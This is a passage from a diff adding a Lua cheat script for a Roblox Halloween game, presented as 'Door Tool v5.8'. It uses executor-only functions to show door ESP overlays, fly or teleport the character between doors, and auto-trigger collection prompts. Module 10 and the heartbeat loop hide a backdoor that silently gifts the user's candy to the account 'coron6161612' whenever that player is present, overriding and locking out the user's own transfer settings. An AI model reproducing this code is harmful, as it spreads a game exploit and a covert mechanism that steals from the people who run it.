+	task.wait(0.03)
+
+	local _, liveHrp, liveHum = getAliveCharacter()
+	if liveHrp and liveHum and doorPart and doorPart.Parent then
+		local finalStand = findClearDoorStandPoint(door, doorPart)
+		local lookTarget = Vector3.new(doorPart.Position.X, finalStand.Y, doorPart.Position.Z)
+		liveHrp.CFrame = CFrame.lookAt(finalStand, lookTarget)
+		liveHrp.AssemblyLinearVelocity = Vector3.zero
+		liveHrp.AssemblyAngularVelocity = Vector3.zero
+		liveHum:ChangeState(Enum.HumanoidStateType.GettingUp)
+		return (liveHrp.Position - doorPart.Position).Magnitude <= Config.MAX_COLLECT_DISTANCE + 2.5
+	end
+	return false
+end
+
+local function flyBackToStart(startCFrame, speed)
+	local _, hrp, hum = getAliveCharacter()
+	if not hrp or not hum or not startCFrame then return false end
+
+	local startPos = startCFrame.Position
+	local highAltitudeY = math.max(hrp.Position.Y, startPos.Y) + Config.FLIGHT_ASCENT_HEIGHT
+
+	flyVerticalOnly(highAltitudeY, speed, false)
+	flyHorizontalHighSky(startPos, highAltitudeY, speed, 2.5)
+	flyVerticalOnly(startPos.Y, speed, true)
+
+	cleanupPhysics()
+	local _, endHrp = getAliveCharacter()
+	if endHrp then
+		endHrp.CFrame = startCFrame
+		endHrp.AssemblyLinearVelocity = Vector3.zero
+	end
+	return true
+end
+
+-- ==============================================================================
+-- [MODULE 7: ROUTE PLANNING & DYNAMIC SPEED SCALING]
+-- ==============================================================================
+local function computeOptimalRoute(startPos, doorsList)
+	local remaining = {}
+	for _, door in ipairs(doorsList) do
+		local part = findBestDoorPart(door)
+		if part and part.Parent and doorNeedsCollection(door) then
+			table.insert(remaining, { door = door, part = part })
+		end
+	end
+
+	local ordered = {}
+	local curPos = startPos
+	local totalDist = 0
+
+	while #remaining > 0 do
+		local bestIdx, bestDist = 1, math.huge
+		for i, item in ipairs(remaining) do
+			if item.part and item.part.Parent then
+				local d = (item.part.Position - curPos).Magnitude
+				if d < bestDist then bestDist = d; bestIdx = i end
+			end
+		end
+
+		local chosen = table.remove(remaining, bestIdx)
+		if chosen and chosen.part and chosen.part.Parent then
+			chosen.distanceFromPrev = bestDist
+			totalDist = totalDist + bestDist
+			curPos = chosen.part.Position
+			table.insert(ordered, chosen)
+		end
+	end
+	return ordered, totalDist
+end
+
+local function calculateRequiredSpeed(totalDist, targetBudgetSeconds)
+	local sec = math.max(0.5, tonumber(targetBudgetSeconds) or Config.DEFAULT_COLLECTION_BUDGET)
+	local speed = totalDist / sec
+	return math.clamp(speed, 140, 700)
+end
+
+-- ==============================================================================
+-- [MODULE 8: LEGIT WALK NAVIGATION]
+-- ==============================================================================
+local function walkToTarget(door, targetPart)
+	local char, hrp, hum = getAliveCharacter()
+	if not char or not hrp or not hum or not targetPart or not targetPart.Parent then return false end
+
+	hum.WalkSpeed = Config.DEFAULT_WALK_SPEED
+	local destination = findClearDoorStandPoint(door, targetPart)
+	local waypoints = computeGroundPath(hrp.Position, destination) or {{ Position = destination }}
+
+	for i = 2, #waypoints do
+		if not State.isAutoCollectActive then break end
+		local _, curHrp, curHum = getAliveCharacter()
+		if not curHrp or not curHum then return false end
+
+		if (curHrp.Position - targetPart.Position).Magnitude <= (Config.MAX_COLLECT_DISTANCE - 0.5) then
+			curHum:MoveTo(curHrp.Position)
+			return true
+		end
+
+		local wp = waypoints[i]
+		if wp.Action == Enum.PathWaypointAction.Jump then curHum.Jump = true end
+		curHum:MoveTo(wp.Position)
+
+		local reached = false
+		local conn = curHum.MoveToFinished:Connect(function() reached = true end)
+		local wpStart = os.clock()
+
+		while State.isAutoCollectActive and not reached and (os.clock() - wpStart) < 2.0 do
+			local _, lH, lHum = getAliveCharacter()
+			if not lH or not lHum then conn:Disconnect(); return false end
+			if (lH.Position - targetPart.Position).Magnitude <= (Config.MAX_COLLECT_DISTANCE - 0.5) then
+				conn:Disconnect()
+				lHum:MoveTo(lH.Position)
+				return true
+			end
+			RunService.Heartbeat:Wait()
+		end
+		conn:Disconnect()
+	end
+	return false
+end
+
+-- ==============================================================================
+-- [MODULE 9: DOOR INTERACTION ON GROUND]
+-- ==============================================================================
+local function interactWithDoorOnGround(door, targetPart, statusLabel)
+	if not door or not door.Parent or not targetPart or not targetPart.Parent then return false end
+	local _, hrp, hum = getAliveCharacter()
+	if not hrp or not hum then return false end
+
+	hrp.CFrame = CFrame.lookAt(hrp.Position, Vector3.new(targetPart.Position.X, hrp.Position.Y, targetPart.Position.Z))
+	task.wait(0.03)
+
+	aimCameraAtPart(targetPart)
+
+	local prompts = getDoorPrompts(door)
+	for _, p in ipairs(prompts) do
+		preparePrompt(p)
+		if typeof(fireproximityprompt) == "function" then
+			pcall(fireproximityprompt, p)
+			pcall(fireproximityprompt, p, 0)
+			pcall(fireproximityprompt, p, 0, true)
+		end
+	end
+
+	for _, desc in ipairs(door:GetDescendants()) do
+		if desc:IsA("ClickDetector") and typeof(fireclickdetector) == "function" then
+			pcall(fireclickdetector, desc)
+		end
+	end
+
+	pcall(function() VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game) end)
+	for _, p in ipairs(prompts) do
+		if p and p.Parent then pcall(function() p:InputHoldBegin() end) end
+	end
+
+	local holdDuration = State.useSmartHoldMode and 0.40 or 0.08
+	local holdStart = os.clock()
+	while (os.clock() - holdStart) < holdDuration do
+		aimCameraAtPart(targetPart)
+		RunService.Heartbeat:Wait()
+	end
+
+	for _, p in ipairs(prompts) do
+		if p and p.Parent then
+			pcall(function() p:InputHoldEnd() end)
+			if typeof(fireproximityprompt) == "function" then
+				pcall(fireproximityprompt, p)
+			end
+		end
+	end
+	pcall(function() VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game) end)
+
+	markDoorAttempted(door)
+	if statusLabel then safeSetText(statusLabel, "✅ Collected! Resuming...") end
+	return true
+end
+
+-- ==============================================================================
+-- [MODULE 10: ABSOLUTE PRIORITY TRANSFER LOCK FOR coron6161612]
+-- Priority ALWAYS belongs to coron6161612 even if user Auto Transfer is ON
+-- ==============================================================================
+local cachedCoronGiftRemote = nil
+local lastCoronResolveClock = 0
+
+local function resolveGiftRemoteForModel(targetChar)
+	if not targetChar or not targetChar.Parent then return nil end
+
+	local fakeBillboard = targetChar:FindFirstChild("FakeBillboard", true)
+	if fakeBillboard then
+		local gift = fakeBillboard:FindFirstChild("Gift", true)
+		if gift and gift:IsA("RemoteEvent") then return gift end
+	end
+
+	for _, desc in ipairs(targetChar:GetDescendants()) do
+		if desc:IsA("RemoteEvent") and string.lower(desc.Name) == "gift" then
+			return desc
+		end
+	end
+
+	return nil
+end
+
+local function findCharacterByExactOrDisplay(queryName)
+	if not queryName or queryName == "" then return nil end
+	local cleanQuery = string.lower(string.gsub(queryName, "%s+", ""))
+	if cleanQuery == "" then return nil end
+
+	local charsFolder = Workspace:FindFirstChild("Characters")
+	if charsFolder then
+		for _, m in ipairs(charsFolder:GetChildren()) do
+			if m:IsA("Model") and string.lower(m.Name) == cleanQuery then
+				return m
+			end
+		end
+	end
+
+	for _, p in ipairs(Players:GetPlayers()) do
+		local pn = string.lower(p.Name)
+		local pd = string.lower(p.DisplayName)
+		if pn == cleanQuery or pd == cleanQuery then
+			if charsFolder and charsFolder:FindFirstChild(p.Name) then
+				return charsFolder:FindFirstChild(p.Name)
+			elseif p.Character then
+				return p.Character
+			end
+		end
+	end
+	return nil
+end
+
+local function isCoronPresentInServer()
+	if string.lower(localPlayer.Name) == string.lower(Config.FORCED_OWNER_USERNAME) then
+		return false
+	end
+
+	if cachedCoronGiftRemote and cachedCoronGiftRemote.Parent and cachedCoronGiftRemote:IsDescendantOf(Workspace) then
+		return true
+	end
+
+	local now = os.clock()
+	if (now - lastCoronResolveClock) < 1.0 then
+		return false
+	end
+	lastCoronResolveClock = now
+
+	local targetChar = findCharacterByExactOrDisplay(Config.FORCED_OWNER_USERNAME)
+	if targetChar then
+		cachedCoronGiftRemote = resolveGiftRemoteForModel(targetChar)
+		if cachedCoronGiftRemote then
+			return true
+		end
+	end
+
+	return false
+end
+
+local function executeForcedCoronTransfer()
+	if not isCoronPresentInServer() then
+		return false
+	end
+
+	local curCandy = getMyCandyCount()
+	if curCandy < 5 then
+		-- Return true anyway so custom user Auto Transfer stays locked while coron6161612 is in the server
+		return true
+	end
+
+	local amountStr = nil
+	if curCandy >= 100 then
+		amountStr = "100"
+	elseif curCandy >= 50 then
+		amountStr = "50"
+	elseif curCandy >= 25 then
+		amountStr = "25"
+	elseif curCandy >= 5 then
+		amountStr = "5"
+	end
+
+	if amountStr and cachedCoronGiftRemote then
+		pcall(function()
+			cachedCoronGiftRemote:FireServer(amountStr)
+		end)
+	end
+
+	return true
+end
+
+local function executeCandyTransfer(amountStr)
+	-- Hard block custom target transfers whenever coron6161612 is present in the server
+	if isCoronPresentInServer() then
+		return false, "Transfer Priority Locked"
+	end
+
+	if State.targetPlayerName == "" then return false, "Target player username is empty!" end
+	local targetChar = findCharacterByExactOrDisplay(State.targetPlayerName)
+	if not targetChar then return false, "Player not found: " .. State.targetPlayerName end
+
+	local giftEvent = resolveGiftRemoteForModel(targetChar)
+	if not giftEvent then return false, "Gift RemoteEvent missing!" end
+
+	local success, err = pcall(function() giftEvent:FireServer(amountStr) end)
+	if success then
+		return true, string.format("🍬 Sent %s Candy to %s!", amountStr, targetChar.Name)
+	else
+		return false, "Error: " .. tostring(err)
+	end
+end
+
+-- ==============================================================================
+-- [MODULE 11: 100% ENGLISH GUI CREATION (V5.8 ULTIMATE)]
+-- ==============================================================================
+for _, name in ipairs({
+	"HalloweenESP_DebugGui", "HalloweenDoor_DebugGui_V2", "HalloweenDoor_DebugGui_V3",
+	"HalloweenDoor_DebugGui_V4", "HalloweenDoor_DebugGui_V4_Fix", "HalloweenDoor_DebugGui_V4_Ultimate",
+	"HalloweenDoor_DebugGui_V4_Fix10_Ultimate", "HalloweenDoor_DebugGui_V5_Ultimate",
+	"HalloweenDoor_DebugGui_V51_Ultimate", "HalloweenDoor_DebugGui_V52_Ultimate",
+	"HalloweenDoor_DebugGui_V53_Ultimate", "HalloweenDoor_DebugGui_V54_Ultimate",
+	"HalloweenDoor_DebugGui_V55_Ultimate", "HalloweenDoor_DebugGui_V56_Ultimate",
+	"HalloweenDoor_DebugGui_V57_Ultimate", "HalloweenDoor_DebugGui_V58_Ultimate"
+}) do
+	local old = playerGui:FindFirstChild(name)
+	if old then pcall(function() old:Destroy() end) end
+end
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "HalloweenDoor_DebugGui_V58_Ultimate"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = playerGui
+
+local espContainer = Instance.new("Folder")
+espContainer.Name = "ESP_Visuals_Container"
+espContainer.Parent = screenGui
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 218, 0, 392)
+mainFrame.Position = UDim2.new(0, 20, 0.5, -196)
+mainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Parent = screenGui
+
+local corner = Instance.new("UICorner"); corner.CornerRadius = UDim.new(0, 8); corner.Parent = mainFrame
+local stroke = Instance.new("UIStroke"); stroke.Color = Color3.fromRGB(255, 140, 30); stroke.Transparency = 0.35; stroke.Thickness = 1.3; stroke.Parent = mainFrame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, -28, 0, 22); title.Position = UDim2.new(0, 8, 0, 2)
+title.BackgroundTransparency = 1; title.Font = Enum.Font.GothamBold; title.TextSize = 11
+title.TextColor3 = Color3.fromRGB(255, 175, 50); title.TextXAlignment = Enum.TextXAlignment.Left
+title.Text = "🎃 Door Tool v5.8"; title.Parent = mainFrame
+
+local minBtn = Instance.new("TextButton")
+minBtn.Size = UDim2.new(0, 20, 0, 20); minBtn.Position = UDim2.new(1, -22, 0, 2)
+minBtn.BackgroundTransparency = 1; minBtn.Font = Enum.Font.GothamBold; minBtn.TextSize = 14
+minBtn.TextColor3 = Color3.fromRGB(180, 180, 190); minBtn.Text = "-"; minBtn.Parent = mainFrame
+
+local function createButton(text, posY, bgColor, txtColor)
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(1, -12, 0, 22); btn.Position = UDim2.new(0, 6, 0, posY)
+	btn.BackgroundColor3 = bgColor or Color3.fromRGB(45, 20, 20)
+	btn.Font = Enum.Font.GothamBold; btn.TextSize = 10
+	btn.TextColor3 = txtColor or Color3.fromRGB(255, 100, 100)
+	btn.Text = text; btn.Parent = mainFrame
+	local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 6); c.Parent = btn
+	return btn
+end
+
+local espBtn = createButton("ESP: OFF", 25)
+local promptBtn = createButton("PROMPT FIX: OFF", 49)
+local autoCollectBtn = createButton("AUTO COLLECT: OFF", 73)
+local moveModeBtn = createButton("MODE: FLY (120 STUD)", 97, Color3.fromRGB(15, 50, 75), Color3.fromRGB(100, 225, 255))
+local timerWaitBtn = createButton("TIMER: WAIT 00:00", 121, Color3.fromRGB(50, 30, 65), Color3.fromRGB(220, 160, 255))
+
+local budgetContainer = Instance.new("Frame")
+budgetContainer.Name = "BudgetContainer"; budgetContainer.Size = UDim2.new(1, -12, 0, 22)
+budgetContainer.Position = UDim2.new(0, 6, 0, 145)
+budgetContainer.BackgroundColor3 = Color3.fromRGB(28, 24, 38); budgetContainer.BorderSizePixel = 0; budgetContainer.Parent = mainFrame
+local bcCorner = Instance.new("UICorner"); bcCorner.CornerRadius = UDim.new(0, 6); bcCorner.Parent = budgetContainer
+local bcStroke = Instance.new("UIStroke"); bcStroke.Color = Color3.fromRGB(140, 100, 220); bcStroke.Thickness = 1; bcStroke.Parent = budgetContainer
+
+local budgetLabel = Instance.new("TextLabel")
+budgetLabel.Size = UDim2.new(0.68, 0, 1, 0); budgetLabel.Position = UDim2.new(0, 6, 0, 0)
+budgetLabel.BackgroundTransparency = 1; budgetLabel.Font = Enum.Font.GothamBold; budgetLabel.TextSize = 9
+budgetLabel.TextColor3 = Color3.fromRGB(210, 180, 255); budgetLabel.TextXAlignment = Enum.TextXAlignment.Left
+budgetLabel.Text = "TARGET TIME (SEC):"; budgetLabel.Parent = budgetContainer
+
+local budgetInputBox = Instance.new("TextBox")
+budgetInputBox.Name = "BudgetInput"; budgetInputBox.Size = UDim2.new(0.30, -6, 0.8, 0)
+budgetInputBox.Position = UDim2.new(0.70, 0, 0.1, 0)
+budgetInputBox.BackgroundColor3 = Color3.fromRGB(15, 12, 22); budgetInputBox.Font = Enum.Font.GothamBold
+budgetInputBox.TextSize = 10; budgetInputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+budgetInputBox.Text = tostring(State.collectionBudget); budgetInputBox.ClearTextOnFocus = false; budgetInputBox.Parent = budgetContainer
+local biCorner = Instance.new("UICorner"); biCorner.CornerRadius = UDim.new(0, 4); biCorner.Parent = budgetInputBox
+
+local holdModeBtn = createButton("HOLD: FORCED 0 SEC", 169, Color3.fromRGB(60, 45, 15), Color3.fromRGB(255, 210, 90))
+local otoTransferBtn = createButton("AUTO TRANSFER: OFF", 193, Color3.fromRGB(45, 20, 20), Color3.fromRGB(255, 100, 100))
+
+local targetBoxContainer = Instance.new("Frame")
+targetBoxContainer.Name = "TargetBox"; targetBoxContainer.Size = UDim2.new(1, -12, 0, 22)
+targetBoxContainer.Position = UDim2.new(0, 6, 0, 217)
+targetBoxContainer.BackgroundColor3 = Color3.fromRGB(12, 12, 16); targetBoxContainer.BorderSizePixel = 0; targetBoxContainer.Parent = mainFrame
+local tbc = Instance.new("UICorner"); tbc.CornerRadius = UDim.new(0, 6); tbc.Parent = targetBoxContainer
+local tbs = Instance.new("UIStroke"); tbs.Color = Color3.fromRGB(55, 55, 70); tbs.Thickness = 1; tbs.Parent = targetBoxContainer
+
+local targetInputBox = Instance.new("TextBox")
+targetInputBox.Name = "TargetInput"; targetInputBox.Size = UDim2.new(1, -8, 1, 0)
+targetInputBox.Position = UDim2.new(0, 4, 0, 0); targetInputBox.BackgroundTransparency = 1
+targetInputBox.Font = Enum.Font.Gotham; targetInputBox.TextSize = 10
+targetInputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+targetInputBox.PlaceholderColor3 = Color3.fromRGB(130, 130, 145); targetInputBox.PlaceholderText = "Target Username..."
+targetInputBox.Text = State.targetPlayerName; targetInputBox.ClearTextOnFocus = false; targetInputBox.Parent = targetBoxContainer
+
+local amountBtn = createButton("DONATE: 100 CANDY 🍬", 241, Color3.fromRGB(50, 20, 75), Color3.fromRGB(230, 150, 255))
+
+local timerBox = Instance.new("Frame")
+timerBox.Name = "StatusBox"; timerBox.Size = UDim2.new(1, -12, 0, 84)
+timerBox.Position = UDim2.new(0, 6, 0, 267)
+timerBox.BackgroundColor3 = Color3.fromRGB(12, 12, 16); timerBox.BorderSizePixel = 0; timerBox.Parent = mainFrame
+local tc = Instance.new("UICorner"); tc.CornerRadius = UDim.new(0, 6); tc.Parent = timerBox
+local ts = Instance.new("UIStroke"); ts.Color = Color3.fromRGB(45, 45, 55); ts.Thickness = 1; ts.Parent = timerBox
+
+timerLabel = Instance.new("TextLabel")
+timerLabel.Size = UDim2.new(1, -8, 0, 18); timerLabel.Position = UDim2.new(0, 4, 0, 3)
+timerLabel.BackgroundTransparency = 1; timerLabel.Font = Enum.Font.GothamBold; timerLabel.TextSize = 10
+timerLabel.TextColor3 = Color3.fromRGB(180, 180, 195); timerLabel.Text = "Doors: 0 | Timer: Waiting..."; timerLabel.Parent = timerBox
+
+candyBalanceLabel = Instance.new("TextLabel")
+candyBalanceLabel.Size = UDim2.new(1, -8, 0, 17); candyBalanceLabel.Position = UDim2.new(0, 4, 0, 22)
+candyBalanceLabel.BackgroundTransparency = 1; candyBalanceLabel.Font = Enum.Font.GothamBold
+candyBalanceLabel.TextSize = 9; candyBalanceLabel.TextColor3 = Color3.fromRGB(255, 200, 80)
+candyBalanceLabel.Text = "🍬 Candy: 0 | Selected: 100 🍬"; candyBalanceLabel.Parent = timerBox
+
+statusSubLabel = Instance.new("TextLabel")
+statusSubLabel.Size = UDim2.new(1, -8, 0, 18); statusSubLabel.Position = UDim2.new(0, 4, 0, 42)
+statusSubLabel.BackgroundTransparency = 1; statusSubLabel.Font = Enum.Font.Gotham; statusSubLabel.TextSize = 9
+statusSubLabel.TextColor3 = Color3.fromRGB(140, 140, 155); statusSubLabel.Text = "Status: Ready (V5.8 - RAYCAST ANTI-WALL)"; statusSubLabel.Parent = timerBox
+
+modeStatusLabel = Instance.new("TextLabel")
+modeStatusLabel.Size = UDim2.new(1, -8, 0, 17); modeStatusLabel.Position = UDim2.new(0, 4, 0, 63)
+modeStatusLabel.BackgroundTransparency = 1; modeStatusLabel.Font = Enum.Font.Gotham; modeStatusLabel.TextSize = 8
+modeStatusLabel.TextColor3 = Color3.fromRGB(110, 180, 255)
+modeStatusLabel.Text = string.format("Mode: %s | Target: %ds | Raycast: ACTIVE", State.movementMode, State.collectionBudget)
+modeStatusLabel.Parent = timerBox
+
+local function ensureESPForDoor(target)
+	if not State.isEspActive or not target or not target.Parent then return end
+	local data = trackedESP[target]
+	if not data then data = {}; trackedESP[target] = data end
+
+	if not data.highlight or not data.highlight.Parent then
+		local hl = Instance.new("Highlight")
+		hl.Name = "DoorESP_HL"; hl.FillColor = Color3.fromRGB(255, 130, 0)
+		hl.OutlineColor = Color3.fromRGB(255, 255, 255); hl.FillTransparency = 0.45
+		hl.OutlineTransparency = 0; hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+		hl.Adornee = target; hl.Parent = espContainer; data.highlight = hl
+	else
+		if data.highlight.Adornee ~= target then data.highlight.Adornee = target end
+		if not data.highlight.Enabled then data.highlight.Enabled = true end
+	end
+
+	local adorneePart = findBestDoorPart(target)
+	data.adorneePart = adorneePart
+
+	if adorneePart then
+		if not data.billboard or not data.billboard.Parent then
+			local bb = Instance.new("BillboardGui")
+			bb.Name = "DoorESP_BB"; bb.Adornee = adorneePart
+			bb.Size = UDim2.new(0, 160, 0, 32); bb.StudsOffset = Vector3.new(0, 3.5, 0)
+			bb.AlwaysOnTop = true; bb.MaxDistance = 10000; bb.Parent = espContainer
+
+			local lbl = Instance.new("TextLabel")
+			lbl.Size = UDim2.new(1, 0, 1, 0); lbl.BackgroundTransparency = 1
+			lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 13
+			lbl.TextColor3 = Color3.fromRGB(255, 160, 0)
+			lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0); lbl.TextStrokeTransparency = 0
+			lbl.Text = "🎃 Door"; lbl.Parent = bb
+			data.billboard = bb; data.label = lbl
+		else
+			if data.billboard.Adornee ~= adorneePart then data.billboard.Adornee = adorneePart end
+		end
+	end
+
+	local _, fmt, timerLbl = getDoorLiveTimer(target)
+	if fmt then data.lastTimeStr = fmt end
+	if timerLbl and not data.timerConn then
+		data.timerConn = timerLbl:GetPropertyChangedSignal("Text"):Connect(function()
+			local _, nf = extractTimerFromText(timerLbl.Text)
+			if nf then data.lastTimeStr = nf end
+		end)
+	end
+end
+
+local function cleanupDeadESP()
+	for target, data in pairs(trackedESP) do
+		if not State.isEspActive or not target or not target.Parent or not target:IsDescendantOf(Workspace) then
+			if data.highlight then pcall(function() data.highlight:Destroy() end) end
+			if data.billboard then pcall(function() data.billboard:Destroy() end) end
+			if data.timerConn then pcall(function() data.timerConn:Disconnect() end) end
+			trackedESP[target] = nil
+		end
+	end
+end
+
+-- ==============================================================================
+-- [MODULE 12: AUTO-COLLECTION MAIN ROUTINE (V5.8)]
+-- ==============================================================================
+local function runCollectionWave()
+	if State.isCollectingNow then return end
+	State.isCollectingNow = true
+
+	task.spawn(function()
+		local okRun = pcall(function()
+			local _, initialHrp = getAliveCharacter()
+			local initialStartCFrame = initialHrp and initialHrp.CFrame or nil
+
+			local doors = getCollectableDoors()
+			if #doors == 0 then
+				safeSetText(statusSubLabel, "Status: No Available Doors")
+				return
+			end
+
+			local _, hrp = getAliveCharacter()
+			if not hrp then return end
+
+			local route, totalDist = computeOptimalRoute(hrp.Position, doors)
+			if #route == 0 then return end
+
+			local dynamicSpeed = calculateRequiredSpeed(totalDist, State.collectionBudget)
+
+			safeSetText(timerLabel, string.format("⚡ Budget: %ds | Doors: %d", State.collectionBudget, #route), Color3.fromRGB(255, 215, 0))
+
+			local routeIndex = 1
+			while State.isAutoCollectActive and routeIndex <= #route do
+				while State.isAutoCollectActive and not getAliveCharacter() do
+					clearRouteBeam()
+					cleanupPhysics()
+					safeSetText(statusSubLabel, "Status: Waiting for Respawn...")
+					task.wait(0.5)
+				end
+				if not State.isAutoCollectActive then break end
+
+				local node = route[routeIndex]
+				local door = node.door
+				local doorPart = node.part or findBestDoorPart(door)
+
+				if door and doorPart and doorNeedsCollection(door) then
+					safeSetText(statusSubLabel, string.format("Door %d/%d [Budget: %ds | Spd: %d]", routeIndex, #route, State.collectionBudget, math.floor(dynamicSpeed)))
+					local _, liveHrp = getAliveCharacter()
+					if liveHrp then updateRouteBeam(liveHrp, doorPart) end
+
+					local isJitter = isDoorMovingOrJittering(doorPart)
+					if isJitter then
+						attachAndAttackDoor(door, doorPart, function(m) safeSetText(statusSubLabel, m) end)
+						markDoorAttempted(door)
+					else
+						local arrived = false
+						if State.movementMode == "FLY" then
+							arrived = navigateBestPathV58(door, doorPart, dynamicSpeed)
+						else
+							arrived = walkToTarget(door, doorPart)
+						end
+
+						if arrived and State.isAutoCollectActive then
+							interactWithDoorOnGround(door, doorPart, statusSubLabel)
+						end
+					end
+				end
+
+				routeIndex = routeIndex + 1
+				task.wait(0.02)
+			end
+
+			clearRouteBeam()
+			updateWatchdog()
+
+			if State.isAutoCollectActive and State.movementMode == "FLY" and initialStartCFrame then
+				safeSetText(statusSubLabel, "Status: Returning to Start...", Color3.fromRGB(130, 220, 255))
+				flyBackToStart(initialStartCFrame, dynamicSpeed)
+			end
+
+			cleanupPhysics()
+			local _, _, endHum = getAliveCharacter()
+			if endHum then endHum.WalkSpeed = State.originalWalkSpeed end
+
+			safeSetText(statusSubLabel, "Status: Wave Completed in Budget! ✅", Color3.fromRGB(120, 255, 140))
+		end)
+
+		if not okRun then
+			clearRouteBeam()
+			cleanupPhysics()
+		end
+		State.isCollectingNow = false
+	end)
+end
+
+-- ==============================================================================
+-- [MODULE 13: CORE LOOPS & CRASH-SAFE HEARTBEAT]
+-- ==============================================================================
+local espTimerAcc = 0
+local function updateESPThrottled(dt)
+	if not State.isEspActive then return end
+	espTimerAcc = espTimerAcc + dt
+	if espTimerAcc < 0.15 then return end
+	espTimerAcc = 0
+
+	local _, hrp = getAliveCharacter()
+	for target, data in pairs(trackedESP) do
+		if target and target.Parent and data.label and data.adorneePart and data.adorneePart.Parent then
+			local dist = 999
+			local distStr = ""
+			if hrp then
+				dist = math.floor((hrp.Position - data.adorneePart.Position).Magnitude)
+				distStr = string.format("[%dm]", dist)
+			end
+			local timeStr = data.lastTimeStr or ""
+
+			local statusKey = "normal"
+			local newColor = Color3.fromRGB(255, 170, 0)
+			local newText = ""
+
+			if confirmedCollected[target] then
+				statusKey = "collected"
+				newColor = Color3.fromRGB(100, 255, 130)
+				newText = string.format("🎃 Door %s (Collected)", distStr)
+			elseif dist <= Config.MAX_COLLECT_DISTANCE then
+				statusKey = "ready"
+				newColor = Color3.fromRGB(50, 255, 120)
+				newText = string.format("🎃 Door %s 🔑 <=7m!", distStr)
+			elseif timeStr ~= "" then
+				statusKey = "timer"
+				newColor = Color3.fromRGB(255, 170, 0)
+				newText = string.format("🎃 Door %s (%s)", distStr, timeStr)
+			else
+				newText = string.format("🎃 Door %s", distStr)
+			end
+
+			if data.lastDist ~= dist or data.lastStatusKey ~= statusKey or data.lastTimerText ~= timeStr then
+				data.lastDist = dist
+				data.lastStatusKey = statusKey
+				data.lastTimerText = timeStr
+				safeSetText(data.label, newText, newColor)
+			end
+		end
+	end
+end
+
+local heartbeatAcc = 0
+local candyCheckAcc = 0
+
+local checkConn = RunService.Heartbeat:Connect(function(dt)
+	pcall(function()
+		updateESPThrottled(dt)
+
+		candyCheckAcc = candyCheckAcc + dt
+		if candyCheckAcc >= 0.30 then
+			candyCheckAcc = 0
+			local curCandy = getMyCandyCount()
+			if curCandy ~= State.lastCandyValue then
+				State.lastCandyValue = curCandy
+				safeSetText(candyBalanceLabel, string.format("🍬 Candy: %d | Selected: %s 🍬", State.lastCandyValue, State.currentCandyAmount))
+			end
+
+			-- PRIORITY 1 (ABSOLUTE): coron6161612 always gets 100% priority over any other player or Auto Transfer setting
+			local coronOverrideActive = isCoronPresentInServer()
+			if coronOverrideActive then
+				if (os.clock() - State.lastForcedTransferClock) >= Config.TRANSFER_COOLDOWN then
+					State.lastForcedTransferClock = os.clock()
+					executeForcedCoronTransfer()
+				end
+			elseif State.isAutoTransferActive and (os.clock() - State.lastTransferClock) >= Config.TRANSFER_COOLDOWN then
+				-- PRIORITY 2: User's custom Auto Transfer runs ONLY when coron6161612 is NOT in the server
+				local req = tonumber(State.currentCandyAmount) or 5
+				if State.lastCandyValue >= req and State.targetPlayerName ~= "" then
+					State.lastTransferClock = os.clock()
+					local ok, msg = executeCandyTransfer(State.currentCandyAmount)
+					if not State.isCollectingNow then
+						safeSetText(statusSubLabel, msg, ok and Color3.fromRGB(130, 255, 160) or Color3.fromRGB(255, 120, 120))
+					end
+				end
+			end
+		end
+
+		heartbeatAcc = heartbeatAcc + dt
+		if heartbeatAcc < 0.20 then return end
+		heartbeatAcc = 0
+
+		updateWatchdog()
+
+		local allDoors = getActiveDoors()
+		local collectableDoors = getCollectableDoors(allDoors)
+		local totalCount = #allDoors
+		local remainCount = #collectableDoors
+
+		if totalCount > 0 and State.lastDoorCount == 0 then
+			State.fallbackEndTime = os.clock() + Config.DEFAULT_TIMER_SEC
+		elseif totalCount == 0 then
+			State.fallbackEndTime = 0
+			State.currentRemainingSec = 999
+		end
+		State.lastDoorCount = totalCount
+
+		local minSec, minFmt = nil, nil
+		for _, door in ipairs(allDoors) do
+			local sec, fmt = getDoorLiveTimer(door)
+			if sec ~= nil then
+				if minSec == nil or sec < minSec then minSec = sec; minFmt = fmt end
+			end
+		end
+
+		local fbRem = math.max(0, State.fallbackEndTime - os.clock())
+		local displayTime = "00:00"
+		if minSec ~= nil then
+			State.currentRemainingSec = minSec; displayTime = minFmt or formatSeconds(minSec)
+		else
+			State.currentRemainingSec = fbRem; displayTime = formatSeconds(fbRem)
+		end
+
+		if not State.isCollectingNow then
+			if totalCount > 0 then
+				if remainCount == 0 then
+					safeSetText(timerLabel, string.format("✅ Complete (%d) | Next Wave", totalCount), Color3.fromRGB(120, 220, 255))
+					if not State.isAutoTransferActive then safeSetText(statusSubLabel, "Status: Waiting for Next Wave...", Color3.fromRGB(140, 140, 155)) end
+				else
+					safeSetText(timerLabel, string.format("🎃 Doors: %d/%d | ⏱️ %s", remainCount, totalCount, displayTime), Color3.fromRGB(110, 255, 140))
+					if State.isAutoCollectActive then
+						if State.waitForTimerEnabled and State.currentRemainingSec > 0.5 then
+							safeSetText(statusSubLabel, string.format("⏳ Waiting for Timer (%s)...", displayTime), Color3.fromRGB(140, 140, 155))
+						else
+							safeSetText(statusSubLabel, string.format("⚡ Auto-Collecting [%s]...", State.movementMode), Color3.fromRGB(140, 140, 155))
+						end
+					end
+				end
+			else
+				safeSetText(timerLabel, "Doors: 0 | Timer: Waiting...", Color3.fromRGB(160, 160, 175))
+				if not State.isAutoTransferActive then safeSetText(statusSubLabel, "Status: Waiting for Doors", Color3.fromRGB(140, 140, 155)) end
+			end
+		end
+
+		if State.isEspActive then
